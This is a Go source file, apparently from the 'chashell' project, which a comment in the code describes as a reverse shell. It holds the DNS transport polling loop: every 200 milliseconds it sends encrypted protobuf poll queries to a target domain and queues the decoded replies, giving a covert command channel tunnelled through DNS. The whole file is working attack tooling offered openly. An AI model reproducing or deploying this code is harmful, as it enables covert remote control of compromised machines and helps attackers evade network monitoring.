package transport

import (
	"chashell/lib/logging"
	"chashell/lib/protocol"
	"strings"
	"time"
)

// Create a queue were polling data will be sent.
var packetQueue = make(chan []byte, 100)

func pollRead(stream dnsStream) {
	for {
		// Sleep, this is a reverse-shell, not a DNS Stress testing tool.
		time.Sleep(200 * time.Millisecond)
		// Check for data !
		poll(stream)
	}
}

func poll(stream dnsStream) {

	// Create a "polling" request.
	pollQuery := &protocol.Message{
		Clientguid: stream.clientGuid,
		Packet: &protocol.Message_Pollquery{
			Pollquery: &protocol.PollQuery{},
		},
	}

	pollPacket, err := dnsMarshal(pollQuery, stream.encryptionKey, true)

	if err != nil {
		logging.Fatal("Poll marshaling fatal error : %v\n", err)
	}

	answers, err := sendDNSQuery([]byte(pollPacket), stream.targetDomain)
	if err != nil {
		logging.Printf("Could not get answer : %v\n", err)
		return
	}

	if len(answers) > 0 {
		packetData := strings.Join(answers, "")
		if packetData == "-" {
			return
		}
		output, complete := Decode(packetData, stream.encryptionKey)
		if complete {
			packetQueue <- output
		} else {
			// More data available. Get it!
			poll(stream)
		}

	}
}
